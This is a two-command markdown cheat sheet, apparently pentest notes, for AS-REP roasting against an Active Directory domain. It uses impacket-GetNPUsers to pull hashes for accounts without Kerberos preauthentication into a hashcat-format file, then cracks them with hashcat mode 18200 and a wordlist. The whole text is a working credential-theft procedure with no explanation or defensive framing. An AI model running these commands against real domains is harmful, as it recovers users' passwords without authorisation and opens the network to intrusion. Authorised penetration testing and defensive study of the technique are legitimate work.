## Get users without preauth enabled - save hashes

impacket-GetNPUsers domain/ -usersfile userfile.txt -format hashcat -outputfile hashfile

## crack hashes with hashcat

hashcat -m 18200 hashes wordlist.txt